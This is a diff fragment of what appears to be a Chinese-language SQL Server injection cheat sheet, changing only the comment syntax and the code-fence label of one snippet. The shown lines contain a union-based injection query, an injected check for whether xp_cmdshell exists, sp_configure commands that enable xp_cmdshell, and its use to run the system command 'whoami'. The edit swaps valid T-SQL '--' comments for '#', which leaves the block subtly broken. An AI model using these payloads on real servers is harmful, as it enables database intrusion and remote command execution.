@@ -68,17 +68,17 @@ select id,name from msg where id=-1 union select top 1 id,name from test.dbo.sys
 ### 0x03 常见的SQL Server扩展存储过程 
 * 执行系统命令
 
-```sql
---判断xp_cmdshell是否被删除
+```bash
+#判断xp_cmdshell是否被删除
 ?id=1 and 1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell');
 
---开启xp_cmdshell
+#开启xp_cmdshell
 exec sp_configure 'show advanced options',1;
 reconfigure;
 exec sp_configure 'xp_cmdshell',1;
 reconfigure;
 
---使用xp_cmdshell执行命令
+#使用xp_cmdshell执行命令
 exec master..xp_cmdshell 'whoami';
 ```
 
